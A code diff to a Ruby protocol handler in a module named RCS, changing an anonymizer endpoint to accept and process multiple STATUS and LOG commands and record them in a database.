@@ -45,10 +45,10 @@ module RCS
       def protocol_post
 
         # receive, check and decrypt a command
-        command = protocol_receive(@http[:cookie], @http_content)
+        commands = protocol_receive(@http[:cookie], @http_content)
 
         # parse the command
-        status, response = protocol_command(command)
+        status, response = protocol_execute_commands(commands)
 
         # encrypt the command
         response = protocol_send(@http[:cookie], response)
@@ -91,13 +91,21 @@ module RCS
         return blob
       end
 
-      def protocol_command(command)
+      def protocol_execute_commands(commands)
 
-        trace :debug, "[#{@anon['name']}] Received command is: #{command.inspect}"
+        trace :debug, "[#{@anon['name']}] Received command is: #{commands.inspect}"
 
-        case command['command']
-          when 'STATUS'
-          when 'LOG'
+        # fallback to array if it's a single command
+        commands = [commands] unless commands.is_a? Array
+
+        # iterate over all the commands
+        commands.each do |command|
+          case command['command']
+            when 'STATUS'
+              protocol_status(command)
+            when 'LOG'
+              protocol_log(command)
+          end
         end
 
         response = {command: 'STATUS', result: {status: 'OK'}}
@@ -107,6 +115,31 @@ module RCS
         return STATUS_SERVER_ERROR, {command: 'STATUS', result: {status: 'ERROR', msg: e.message}}
       end
 
+      def protocol_status(command)
+        params = command['params']
+        status = params['status']
+        stats = params['stats']
+        msg = params['mgs']
+        version = params['version']
+
+        # symbolize keys
+        stats = stats.inject({}){|h,(k,v)| h.merge({ k.to_sym => v}) }
+
+        report_status 'RCS::ANON::' + @anon['name'], @anon['address'], 'anonymizer', status, msg, stats, version
+      end
+
+      def report_status(name, address, type, status, message, stats, version=0)
+
+        trace :info, "[NC] [#{name}] #{address} #{status} #{message}"
+
+        # send the status to the db
+        DB.instance.update_status name, address, status, message, stats, type, version
+      end
+
+      def protocol_log(command)
+        params = command['params']
+        DB.instance.collector_add_log(@anon['_id'], params['time'], params['type'], params['desc'])
+      end
 
     end
 
